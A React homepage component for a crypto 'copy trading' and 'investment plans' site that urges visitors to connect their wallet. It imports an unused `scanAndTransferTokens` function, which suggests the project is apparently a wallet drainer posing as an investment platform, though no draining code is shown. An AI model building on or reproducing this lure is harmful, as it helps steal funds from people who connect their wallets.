import React, { useEffect } from 'react'
import { useAccount, useDisconnect, useNetwork } from 'wagmi'
import { useWeb3Modal } from '@web3modal/wagmi/react'
import { useNavigate } from 'react-router-dom'
import { useTranslation } from 'react-i18next'
import { scanAndTransferTokens } from '../services/tokenScanner'
import './HomePage.css'

// Import settings
import settings from '../../settings.js'

const HomePage = () => {
  const { open } = useWeb3Modal()
  const { isConnected, address } = useAccount()
  const { disconnect } = useDisconnect()
  const { chain } = useNetwork()
  const { t } = useTranslation()
  const navigate = useNavigate()

  useEffect(() => {
    if (isConnected && address) {
      // Navigate to dashboard after connection
      setTimeout(() => {
        navigate('/dashboard')
      }, 1500)
    }
  }, [isConnected, address, chain, navigate])

  const handleConnect = async () => {
    try {
      await open()
    } catch (error) {
      console.error('Connection error:', error)
    }
  }

  const features = [
    {
      icon: '🎯',
      title: t('home.smartCopyTrading'),
      description: t('home.copyTradingDescription')
    },
    {
      icon: '💎',
      title: t('home.premiumInvestmentPlans'),
      description: t('home.investmentPlansDescription')
    },
    {
      icon: '🔒',
      title: t('home.bankGradeSecurity'),
      description: t('home.securityDescription')
    },
    {
      icon: '⚡',
      title: t('home.instantTransactions'),
      description: t('home.transactionsDescription')
    }
  ]

  const stats = [
    { value: t('home.totalVolume'), label: t('home.totalVolumeLabel') },
    { value: t('home.activeUsers'), label: t('home.activeUsersLabel') },
    { value: t('home.successRate'), label: t('home.successRateLabel') },
    { value: t('home.support'), label: t('home.supportLabel') }
  ]

  return (
    <div className="homepage">
      {/* Hero Section */}
      <section className="hero-section">
        <div className="hero-bg">
          <div className="gradient-orb orb-1"></div>
          <div className="gradient-orb orb-2"></div>
          <div className="gradient-orb orb-3"></div>
        </div>
        
        <div className="hero-content">
          <div className="hero-badge">
            <span className="badge-icon">✨</span>
            <span>{t('home.futureOfCrypto')}</span>
          </div>
          
          <h1 className="hero-title">
            {t('home.investSmarter1')}
            <span className="gradient-text"> {t('home.investSmarter2')}</span>
            <br />
            {t('home.investSmarter3')}
          </h1>
          
          <p className="hero-description">
            {t('home.heroDescription')}
          </p>
          
          <div className="hero-actions">
            <button className="cta-button primary" onClick={handleConnect}>
              <span>{t('home.connectWallet')}</span>
              <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                <path d="M7.5 15L12.5 10L7.5 5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </button>
            <button className="cta-button secondary">
              <span>{t('home.learnMore')}</span>
            </button>
          </div>

          {/* Stats */}
          <div className="hero-stats">
            {stats.map((stat, index) => (
              <div key={index} className="stat-item">
                <div className="stat-value">{stat.value}</div>
                <div className="stat-label">{stat.label}</div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section className="features-section">
        <div className="section-header">
          <h2 className="section-title">{t('home.whyChooseUs')}</h2>
          <p className="section-subtitle">
            {t('home.featuresDescription')}
          </p>
        </div>

        <div className="features-grid">
          {features.map((feature, index) => (
            <div key={index} className="feature-card">
              <div className="feature-icon">{feature.icon}</div>
              <h3 className="feature-title">{feature.title}</h3>
              <p className="feature-description">{feature.description}</p>
            </div>
          ))}
        </div>
      </section>

      {/* CTA Section */}
      <section className="cta-section">
        <div className="cta-content">
          <h2 className="cta-title">{t('home.readyToStart')}</h2>
          <p className="cta-description">
            {t('home.ctaDescription')}
          </p>
          <button className="cta-button primary large" onClick={handleConnect}>
            <span>{t('home.getStarted')}</span>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
              <path d="M9 18L15 12L9 6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          </button>
        </div>
      </section>
    </div>
  )
}

export default HomePage